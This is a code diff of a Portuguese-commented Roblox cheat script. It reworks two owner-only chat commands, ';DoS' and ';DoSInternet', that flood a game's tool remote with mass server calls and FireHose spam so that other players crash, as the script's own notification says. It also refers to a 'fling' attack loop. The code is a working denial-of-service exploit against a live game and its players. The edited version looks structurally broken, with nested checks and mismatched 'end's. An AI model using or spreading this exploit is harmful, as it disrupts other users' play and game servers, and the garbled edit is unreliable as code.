@@ -425,107 +425,128 @@ local function OuvirChat(Jogador, Mensagem)
     -- 2. Comandos restritos estritamente ao seu ID de Dono
     if Jogador.UserId == ID_DONO then
         if Mensagem == ";DoS" then
-            
-            local player = game:GetService("Players").LocalPlayer
-            if not player then return end
-            local replicatedStorage = game:GetService("ReplicatedStorage")
-            local starterGui = game:GetService("StarterGui")
+            -- =============================================================================
+-- VERIFICAÇÃO DO COMANDO: ;DoS (CORRIGIDO PARA O CHAT)
+-- =============================================================================
+if msg:match("^;DoS$") then
+    -- Correção: Usando o padrão de nomenclatura unificado 'LocalPlayer'
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local starterGui = game:GetService("StarterGui")
 
-            local character = player.Character or player.CharacterAdded:Wait()
-            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
-            if not rootpart then return end
-            local oldcf = rootpart.CFrame
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+    if not rootpart then return end
+    local oldcf = rootpart.CFrame
 
-            local re = replicatedStorage:FindFirstChild("RE")
-            local toolRemote = re and re:FindFirstChild("1Too1l")
-            if not toolRemote then return end
+    local re = replicatedStorage:FindFirstChild("RE")
+    local toolRemote = re and re:FindFirstChild("1Too1l")
+    if not toolRemote then return end
 
-            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
+    pcall(function() 
+        starterGui:SetCore("SendNotification", { 
+            Title = "Ataque DoS Iniciado", 
+            Text = "Aguarde os jogadores Crashar", 
+            Button1 = "Ok", 
+            Duration = 5 
+        }) 
+    end)
 
+    task.spawn(function()
+        for m = 1, 999999 do
             task.spawn(function()
-                for m = 1, 999999 do
-                    task.spawn(function()
-                        if toolRemote:IsA("RemoteFunction") then
-                            toolRemote:InvokeServer("PickingTools", "FireHose")
-                        else
-                            toolRemote:FireServer("PickingTools", "FireHose")
-                        end
-                    end)
-
-                    local backpack = player:FindFirstChild("Backpack")
-                    if backpack then
-                        local fireHose = backpack:FindFirstChild("FireHose")
-                        if fireHose and fireHose:FindFirstChild("ToolSound") then
-                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
-                        end
-                    end
-                    if m % 15 == 0 then task.wait(0.1) end
+                if toolRemote:IsA("RemoteFunction") then
+                    toolRemote:InvokeServer("PickingTools", "FireHose")
                 end
             end)
 
-            task.wait(0.4)
-            player.CharacterRemoving:Wait()
-            local newCharacter = player.CharacterAdded:Wait()
-            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
-            local humanoid = newCharacter:WaitForChild("Humanoid", 15)
-
-            if newRootPart and humanoid then
-                task.wait(0.7)
-                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-                newRootPart.CFrame = oldcf
-                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-            end
-
-            local backpack = player:WaitForChild("Backpack", 10)
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
             if backpack then
-                local items = backpack:GetChildren()
-                local equipCount = 0
-                for i = 1, #items do
-                    local item = items[i]
-                    if item:IsA("Tool") and item.Name == "FireHose" then
-                        equipCount = equipCount + 1
-                        task.defer(function() item.Parent = newCharacter end)
-                        if equipCount % 8 == 0 then task.wait(0.02) end 
-                    end
+                local fireHose = backpack:FindFirstChild("FireHose")
+                if fireHose and fireHose:FindFirstChild("ToolSound") then
+                    fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                 end
             end
+            if m % 15 == 0 then task.wait(0.1) end
+        end
+    end)
 
-            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado com sucesso.", Duration = 4 })
-            
-        elseif Mensagem == ";DoSInternet" then
-            
-            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
-            local backpack = LocalPlayer:WaitForChild("Backpack") 
-            local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
-            local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
-            
-            if toolRemote and toolRemote:IsA("RemoteFunction") then 
-                local args1 = { "PickingTools" , "FireHose" } 
-                local args2 = { "FireHose" , "DestroyFireHose" } 
-                
-                for i = 1, 30 do 
-                    task.spawn(function() 
-                        for m = 1, 289 do 
-                            pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
-                            if m % 40 == 0 then task.wait() end 
-                        end 
-                        task.spawn(function() 
-                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
-                            if fireHose then 
-                                local toolSound = fireHose:FindFirstChild("ToolSound") 
-                                if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
-                            end 
-                        end) 
-                    end) 
-                    task.wait(0.05) 
-                end 
+    task.wait(0.4)
+    LocalPlayer.CharacterRemoving:Wait()
+    local newCharacter = LocalPlayer.CharacterAdded:Wait()
+    local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+    local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+    if newRootPart and humanoid then
+        task.wait(0.7)
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+        newRootPart.CFrame = oldcf
+        newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    end
+
+    local backpack = LocalPlayer:WaitForChild("Backpack", 10)
+    if backpack then
+        local items = backpack:GetChildren()
+        local equipCount = 0
+        for i = 1, #items do
+            local item = items[i]
+            if item:IsA("Tool") and item.Name == "FireHose" then
+                equipCount = equipCount + 1
+                task.defer(function() item.Parent = newCharacter end)
+                if equipCount % 8 == 0 then task.wait(0.02) end 
             end
-
-            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Internet) ativado com sucesso.", Duration = 4 })
         end
     end
-end
 
+    Rayfield:Notify({ 
+        Title = "Painel Privado", 
+        Content = "Gatilho DoS (Normal) ativado com sucesso.", 
+        Duration = 4,
+        Image = 4483362458
+    })
+            end
+            
+        -- =============================================================================
+-- VERIFICAÇÃO DO COMANDO: ;DoSInternet (CORRIGIDO PARA O CHAT)
+-- =============================================================================
+if msg:match("^;DoSInternet$") then
+    -- Correção: Substituído 'Mensagem' por 'msg' (variável padrão do chat do Roblox)
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
+    local backpack = LocalPlayer:WaitForChild("Backpack") 
+    local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
+    local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
+    
+    if toolRemote and toolRemote:IsA("RemoteFunction") then 
+        local args1 = { "PickingTools" , "FireHose" } 
+        local args2 = { "FireHose" , "DestroyFireHose" } 
+        
+        for i = 1, 30 do 
+            task.spawn(function() 
+                for m = 1, 289 do 
+                    pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
+                    if m % 40 == 0 then task.wait() end 
+                end 
+                task.spawn(function() 
+                    local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
+                    if fireHose then 
+                        local toolSound = fireHose:FindFirstChild("ToolSound") 
+                        if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
+                    end 
+                end) 
+            end) 
+            task.wait(0.05) 
+        end 
+    end
+
+    Rayfield:Notify({ 
+        Title = "Painel Privado", 
+        Content = "Gatilho DoS (Internet) ativado com sucesso.", 
+        Duration = 4,
+        Image = 4483362458
+    })
+            end
+            
 -- Variável de controle do loop de ataque (declarada fora do evento para consistência)
 local flingActive = false
 
